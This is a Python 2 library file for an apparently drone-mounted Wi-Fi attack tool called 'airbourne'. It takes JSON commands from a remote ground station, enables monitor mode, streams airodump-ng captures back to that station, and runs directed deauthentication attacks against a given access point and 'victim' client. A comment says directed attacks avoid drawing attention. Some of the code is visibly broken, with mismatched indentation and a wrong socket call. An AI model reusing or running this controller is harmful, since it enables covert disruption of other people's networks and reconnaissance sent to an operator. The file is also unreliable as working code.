#!/usr/bin/python 

"""lib.py contains everthing which is not directly
related to sockets but hardly could be missed in 
airbourne.py

connectToServer()
initConnection()
lostConnection()
postOffice()
monitoreHandler()
dumpHandler()
sendData() just threaded
deauthHandler()
logHandler()
errorHandler()"""


import os
import sys
import json
import time
import socket
import logging
import threading
import subprocess

from threading import *
from rfc import *


##################################################################
# function connectToServer: parameters = ip-address of server    #
# set a connection to socket. in best case just called one times # 
##################################################################
def connectToServer(ip_address):
	
	global sock 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if sock == 0:
		logHandler("ERROR", "Could not create socket")
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
	print >>sys.stderr, 'connecting to %s' % ip_address
	try:
		sock.connect((ip_address, PORT))
	except socket.error:
		logHandler("ERROR", "Coud not connect on Socket")

	return

#################################################################
# Function initConnection										#
# starts to send hello messages and wait to receive responses. 	#
# A response is required to access the stage where other     	#
# packages are accepted and processed.
#################################################################
def initConnection():
	global lock 
	lock = Lock()

	sock.sendall(createHello()) 

	#receives messages after sending hello to GCS.
	while True:
		data = sock.recv(1024)
		if data == 0:
				logHandler("ERROR", "Connection lost while waiting for hello response")
				closeConnection()
				return #to airbourne.py in connecting-loop
		parsed_json = json.loads(data)
		print data
		#checks if it has received a response message. if not, than wait again
		if parsed_json['Type'] != RESP_MSG:
			logHandler("INFO", "Received undefined package in hello-stage")
			continue
		else:  
			while True:
					data = sock.recv(1024)
					print data
				#if data == SIGINT:
				#	logHandler("ERROR", "Connection lost while waiting for packets")
				#	closeConnection()
				#	sys.exit(0) #to airbourne.py in connectingloop
				#print data
				parsed_json = json.loads(data)
				postOffice(parsed_json)


		#if response leads to break out of the first while-loop it will listen for 
		#further packets. They will go to the postoffice function of lib.py.
		

##################################################################
# Function lostConnection close sockets and write to error-log	 #
# that connection is gone lost - which is never intended by this #
# server design, so it counts as error. 						 #
##################################################################
def closeConnection():
	socket.shutdown()
	socket.close()
	logHandler("INFO", "Closed sockets")
	return

#################################################################
# Function postOffice assig the read json-String to the proper	#	
# handler funtion by analysing the Type-Key.					#
#################################################################
def postOffice(parsed_json):

	if parsed_json['Type'] == MON_MSG:
		monitoreHandler(parsed_json)

	elif parsed_json['Type'] == DUMP_MSG:
		dumpHandler(parsed_json)

	elif parsed_json['Type'] == DEAUTH_MSG:
		deauthHandler(parsed_json)

	elif parsed_json['Type'] == OK_MSG:
		#if lib.py sends a dump-Packet it will lock till GCS sends an ok-packet
		#if this packet is received the lock will be released so lib.py can send further dump-packets. 
		lock.release()
	return


##################################################################
# Function monitoreHandler: parameters = resceived Json-String	 #
# By analysing the command-key of the json-String the airmon-ng  #
# script will be called to start or stop airmon.				 # 
# (Where no script paramter means "start airmon")                #
##################################################################
def monitoreHandler(parsed_json):
		
		if parsed_json['Command'] == STOP:
			cmd = ['./airmon-ng.sh', 'stop']
			p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
			for line in p.stdout:
   				jsonString = {
   							'airmon stop' : line,
   				}
   				#sock.sendall(json.dumps(jsonString) + '\0')
   				print jsonString
			p.wait()

		elif parsed_json['Command'] == START:
			cmd = ['./airmon-ng.sh']
			p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
			for line in p.stdout:
   				jsonString = {
   							'airmon start' : line,
   				}
   				sock.sendall(json.dumps(jsonString) + '\0')
   				print jsonString
			p.wait()
		
		return


#################################################################
# Function dumpHandler: paramters = resceived Json-String.  	#
# If Command-Key is "START" start thread of function sendData.	#
# If Command-Key is "STOP"  stop thread of funtion sendData. 	#
#################################################################
def dumpHandler(parsed_json):
	
	global dumpThread
	global pill2kill

	#just start sendData-thread if Command-Key ist "START" and there are no inctances running yet
	if parsed_json['Command'] == START and threading.active_count() == 0:
		pill2kill = threading.Event()
		dumpThread = threading.Thread(target=sendData, args=(pill2kill, parsed_json['Channel'],))
		dumpThread.start()
		return

	#just process the commands below if there is running 1 inctance of sendData-thread
	elif parsed_json['Command'] == STOP and threading.active_count() == 1:
		pill2kill.set()
   		dumpThread.join()
		return


###################################################################
# Function sendData: paramters = stopEvent and Channel.			  #
# start airodump by starting the specific script. the script will #
# create a csv-file which contains the output of airodump-ng.	  #
# Content of csv will be send line by line as data-typed 		  #
# json-String to GCS. Runs constantely as thread while GCS does   #
# send further packets. 										  #
###################################################################
def sendData(stop_event,channel):
	#check if file was already created in an old run 
	if os.path.exists('sendme-01.csv'):
		os.system('rm sendme-01.csv')

	#check if airodump should be started to list beacons of every channel
	if channel != 0:
		cmd = ['./airodump-ng.sh', str(channel)]

	#or rather of specific ones
	elif channel == 0:
		cmd = ['./airodump-ng.sh']
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
	
	#waiting for airodump to create the csv file
	while True:
		if os.path.exists('sendme-01.csv'):
			break

	#open csv in read-mode ans read line by line
	while True: 
		fd = open('sendme-01.csv', 'r')
		count = 0

		for line in fd:
			print "Count = " + str(count)
			if count == 0:
				count = count + 1
				continue

			#locked as long GCD send an ok which means last information received
			#will be set free in airbourne.py 
			lock.acquire() 
			#if first line is send as head-packet which GCD needs
			#to properly presenting the captured dump. 
			if count == 1:
				sock.sendall(createHead(line))     
			else:
		   		sock.sendall(createData(line))
		   	count = count + 1
		#set fd to the very first bit of the file so the whole file 
		#could be send again
		fd.seek(0)

		#wait 10 seconds for the kill event which will be triggerd by
		#send airodump-stop package sent by the GCS. Besided it will block
		#for 10 seconds to prevent sending redundant data of airodump.
		if stop_event.wait(10):
				return


####################################################################
# Function deauthHandler: paramters = received json-String.	       #
# This functions requires 3 key-values to execute: 				   #
# AP-BSSID, victim client-BSSID, amount of deauth-beacons 		   #
# For now we just want to spell directed deauth-attacks so we      #
# possibly avoid to much attention at nw-domains. As well infinity #
# loop for deauth-beacons is not possible.
####################################################################
def deauthHandler(parsed_json):
	
	cmd = ["./deauth.sh", str(parsed_json['Count']), str(parsed_json['Ap']), str(parsed_json['Victim'])]
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
	countDown = 0

	for line in p.stdout:
		jsonString = {
				'deauth count' : int(parsed_json['Count'])-countDown,
		}	
		countDown = countDown+1
		print jsonString
		#sock.sendall(json.dumps(jsonString) + '\0')
	return
	

###################################################################
# Funtion logHandler: paramters = level of log and message		  #
# writes certain events to logfile airbourne.log				  #
###################################################################
def logHandler(log_type, log_message):
	logging.basicConfig(format = '%(asctime)s %(levelname)s:%(message)s', 
			datefmt='%m/%d/%Y-%I:%M:%p', filename="airbourne.log", level=logging.INFO)
	if log_type == "INFO":
		logging.info(log_message)
	elif log_type == "WARNING":
		logging.warning(log_message)
	elif log_type == "ERROR":
		logging.error(log_message)
	return


def errorHandler(jsonString, message):
	print "toDo: errorHandler"
